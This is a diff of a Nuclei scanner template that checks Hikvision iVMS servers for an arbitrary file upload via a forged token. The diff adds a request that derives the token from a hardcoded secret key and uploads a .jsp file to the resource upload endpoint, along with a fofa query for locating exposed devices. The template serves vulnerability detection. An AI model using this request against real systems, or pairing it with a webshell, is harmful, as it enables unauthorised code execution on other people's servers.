@@ -3,32 +3,34 @@ id: hikvision-ivms-file-upload-bypass
 info:
   name: Hikvison iVMS - File Upload Bypass
   author: SleepingBag945
-  severity: high
-  description: |
-    Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. By using the forged token, they can make requests to the "/resourceOperations/upload" interface to upload files of their choice. This can lead to gaining unauthorized webshell access on the server, enabling remote execution of malicious code.
+  severity: critical
+  description: Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. By using the forged token, they can make requests to the "/resourceOperations/upload" interface to upload files of their choice. This can lead to gaining unauthorized webshell access on the server, enabling remote execution of malicious code.
   reference:
     - https://blog.csdn.net/qq_41904294/article/details/130807691
-    - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB.md
-    - https://github.com/MD-SEC/MDPOCS/blob/main/Hikvison_iSecure_Center_ResourceOperations_Upload_File_Poc.py
   metadata:
     verified: true
     fofa-query: icon_hash="-911494769"
-    max-request: 1
   tags: hikvision,ivms,intrusive,fileupload,auth-bypass
 
 http:
   - raw:
       - |
+        @timeout: 5s
         POST /eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}} HTTP/1.1
         Host: {{Hostname}}
-        Cookie: ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
 
-        service={{url_encode(concat("{{RootURL}}","/home/index.action"))}}
+        ------WebKitFormBoundaryGEJwiloiPo
+        Content-Disposition: form-data; name="fileUploader";filename="{{randstr}}.jsp"
+        Content-Type: image/jpeg
 
-    matchers-condition: and
+        {{randstr}}
+        ------WebKitFormBoundaryGEJwiloiPo 
+
     matchers:
-      - type: dsl
-        dsl:
-          - "status_code == 200"
-          - "contains(body,'errorMessage') && contains(body,'The current request is not a multipart request')"
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"resourceName":'
         condition: and
